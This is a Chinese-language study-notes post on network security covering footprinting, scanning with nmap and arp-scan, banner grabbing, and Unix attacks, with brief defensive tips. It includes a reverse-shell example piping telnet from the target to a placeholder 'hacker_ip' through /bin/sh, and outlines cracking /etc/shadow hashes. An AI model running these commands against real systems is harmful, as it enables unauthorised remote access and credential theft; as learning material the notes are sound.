
---
title: "网络安全 Network Security"
date: 2022-01-23T22:54:00.000Z
lastmod: 2022-12-30T07:37:00.000Z
tags: ['network', 'security', 'tools']
draft: false
---



# 踩点


## DNS zone transfer 区域传送

[https://digi.ninja/projects/zonetransferme.php](https://digi.ninja/projects/zonetransferme.php)

[https://www.mi1k7ea.com/2021/04/03/浅析DNS域传送漏洞/](https://www.mi1k7ea.com/2021/04/03/%E6%B5%85%E6%9E%90DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/)

```bash
dig axfr @nsztm1.digi.ninja zonetransfer.me
```


## 网络拓扑

```bash
traceroute

# -I: ICMP, -U: UDP, -T: TCP
traceroute -I

# tells the network to route the packet through the specified gateway 
# (most routers have disabled source  routing  for  security reasons).
traceroute -g 10.10.10.5
```


ping 一般默认走 ICMP 协议。

ICMP（Internet Control Message Protocol，互联网控制协议）是网络层协议，但是它不像 IP 协议和 ARP 协议一样直接传递给数据链路层，而是**先封装成 IP 数据包然后再传递给数据链路层**。所以在 IP 数据包中如果协议类型字段的值是 1 的话，就表示 IP 数据是 ICMP 报文。IP 数据包就是靠这个协议类型字段来区分不同的数据包的。

在 IP 通信中如果某个包因为未知原因没有到达目的地址，那么这个具体的原因就是由 ICMP 负责告知。而 ICMP 协议的类型定义中就清楚的描述了各种报文的含义。


# 扫描

```bash
sudo arp-scan 172.19.50.0/24

# 端口扫描，-Pn 忽略主机发现，避免 ICMP 被屏蔽
nmap -Pn 172.19.50.218
```


### 协议栈指纹分析技术

协议栈指纹分析技术：Stack Fingerprinting，分主动式、被动式。

通过检查协议栈具体实现的细微差异，侦测目标设备的操作系统。

```bash
# 扫描 OS，主动式
sudo nmap -O -Pn 192.168.1.1
```


# 查点


### 服务指纹分析技术

```bash
# 检查某个服务的版本号
nmap -sV 192.168.1.1 -p 22
```


### 漏洞扫描器  
  
-   Nessus  
-   nmap script engine



### 标语抓取技术

连接到远程应用程序，并观察其输出。

```bash
telnet www.example.com 80

# netcat, TCP/IP 瑞士军刀
nc -v www.example.com 80

```



# 攻击 Unix


## 远程访问


### 缓冲区溢出攻击  
  
-   堆栈缓冲区溢出  
-   heap 缓冲区溢出


### 反向通道  
  
1.  在自己的机器上打开 nc 监听器，接受反向的 telnet 连接；  
1.  在目标机器上执行 telnet 命令，建立反向通道。


Example 1：

```bash
# 自己的机器，这个终端接受 sh 命令输入
nc -l -n -v -p 80

# 自己的机器，这个终端会打印 sh 标准输出
nc -l -n -v -p 25

# 目标机器
/bin/telnet hacker_ip 80 | /bin/sh | /bin/telnet hacker_ip 25
```


> Security Tips  
``chmod 750 telnet`` 禁止不必要执行 telnet 的用户去执行它。   



## 本地访问


### 离线口令破解  
  
1.  获取 ``/etc/shadow`` 文件  
      
    1.  MCF 格式：`$算法$salt$hash` ，算法1：MD5，算法2：Blowfish   
1.  计算 ``hash(salt+password)`` ，和 shadow 文件中的值比较，匹配则破解成功


破解程序：John the Ripper，AKA: John, JTR


### 本地缓冲区溢出

一般以 SUID 属性的文件为目标，从而允许攻击者以 root 特权执行命令。

参考：[Linux Tips]({{< relref "linux-tips" >}}) 

> Security Tips  
尽量不要设置 SUID 位。  

